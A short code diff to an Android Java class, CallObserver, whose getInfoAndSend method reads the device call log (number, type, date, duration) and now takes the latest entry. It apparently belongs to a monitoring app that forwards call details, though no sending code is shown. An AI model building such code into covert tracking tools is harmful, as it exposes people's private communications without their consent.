@@ -20,7 +20,7 @@ public class CallObserver extends AbstractObserver {
         this.service = service;
     }
 
-    private void getInfoAndSend(){
+    protected void getInfoAndSend(){
         StringBuffer sb = new StringBuffer();
         Uri callLogUri = CallLog.Calls.CONTENT_URI;
         try{
@@ -30,7 +30,7 @@ public class CallObserver extends AbstractObserver {
             int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
             int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
             sb.append("Call Details :");
-            managedCursor.moveToFirst();
+            managedCursor.moveToLast();
             if (!managedCursor.isAfterLast()) {
                 String phNumber = managedCursor.getString(number);
                 String callType = managedCursor.getString(type);
